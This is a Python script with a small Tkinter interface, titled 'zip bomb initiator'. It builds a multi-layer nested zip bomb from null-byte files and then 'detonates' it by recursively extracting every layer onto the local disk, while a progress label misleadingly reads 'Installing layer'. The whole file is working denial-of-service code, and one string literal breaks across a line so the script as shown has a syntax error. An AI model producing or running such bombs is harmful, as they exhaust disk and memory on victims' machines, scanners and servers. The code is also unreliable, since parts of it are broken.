import os
import sys
import shutil
import time
import threading
import zipfile
import tkinter as tk
from tkinter import ttk, messagebox

# ================= ZIP BOMB GENERATION =================

def get_file_size(filename):
    st = os.stat(filename)
    return st.st_size

def generate_dummy_file(filename):
    with open(filename, 'wb') as f:
        f.write(b'\0' * 1024 * 1024)  # 1MB of null bytes

def get_filename_without_extension(name):
    return name[:name.rfind('.')]

def get_extension(name):
    return name[name.rfind('.')+1:]

def compress_file(infile, outfile):
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)

def make_copies_and_compress(infile, outfile, n_copies):
    with zipfile.ZipFile(outfile, mode='w', allowZip64=True) as zf:
        for i in range(n_copies):
            f_name = '%s-%d.%s' % (get_filename_without_extension(infile), i, get_extension(infile))
            shutil.copy(infile, f_name)
            zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
            os.remove(f_name)

def create_zip_bomb(n_levels, out_zip_file):
    dummy_name = 'dummy.txt'
    start_time = time.time()
    generate_dummy_file(dummy_name)
    level_1_zip = '1.zip'
    compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size_mb = 1
    for i in range(1, n_levels + 1):
        make_copies_and_compress(f'{i}.zip', f'{i+1}.zip', 10)
        decompressed_size_mb *= 10
        os.remove(f'{i}.zip')
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
    os.rename(f'{n_levels + 1}.zip', out_zip_file)
    end_time = time.time()
    compressed_kb = get_file_size(out_zip_file) / 1024.0
    decompressed_gb = decompressed_size_mb / 1024
    return compressed_kb, decompressed_gb, end_time - start_time

# ================= EXTRACTION =================

def extract_all_recursive(base_dir, max_layers):
    layer = 0
    while layer < max_layers:
        found = False
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.endswith(".zip"):
                    zip_path = os.path.join(root, file)
                    target_dir = os.path.join(root, file + "_unzipped")
                    try:
                        with zipfile.ZipFile(zip_path, 'r') as zf:
                            zf.extractall(target_dir)
                        os.remove(zip_path)
                        found = True
                    except Exception:
                        pass
        if not found:
            break
        layer += 1
        update_layer_progress(layer, max_layers)

def update_layer_progress(current, total):
    percent = int((current / total) * 100)
    bar["value"] = percent
    label_var.set(f"Installing layer {current}/{total}...")
    root.update_idletasks()

def detonate_zip_bomb(max_layers):
    os.makedirs("bomb_detonated", exist_ok=True)
    shutil.copy(bomb_filename, f"bomb_detonated/{bomb_filename}")
    extract_all_recursive("bomb_detonated", max_layers)
    label_var.set("Done!")

# ================= GUI =================

def on_start():
    try:
        n_layers = int(n_layers_var.get())
        if n_layers <= 0:
            raise ValueError
    except ValueError:
        messagebox.showerror("Invalid input", "Please enter a positive integer.")
        return

    def worker():
        label_var.set("Creating ZIP archive...")
        bar["value"] = 0
        comp_kb, decomp_gb, gen_time = create_zip_bomb(n_layers, "generated.zip")
        global bomb_filename
        bomb_filename = "generated.zip"
        label_var.set(f"Generated ({comp_kb:.2f} KB -> {decomp_gb:.2f} GB) in {gen_time:.2f}s")
        time.sleep(1)
        detonate_zip_bomb(n_layers)

    threading.Thread(target=worker, daemon=True).start()

def run_gui():
    global root, bar, label_var, n_layers_var
    root = tk.Tk()
    root.title("zip bomb initiator")
    root.geometry("350x180")

    ttk.Label(root, text="Number of layers:").pack(pady=(10, 0))
    n_layers_var = tk.StringVar(value="5")
    ttk.Entry(root, textvariable=n_layers_var, width=10).pack(pady=5)

    label_var = tk.StringVar(value="Waiting to start...")
    label_var = tk.StringVar(value="size tables:
    1-40kb")
    ttk.Label(root, textvariable=label_var).pack(pady=5)

    bar = ttk.Progressbar(root, length=250, mode='determinate', maximum=100)
    bar.pack(pady=5)

    ttk.Button(root, text="Start", command=on_start).pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    run_gui()
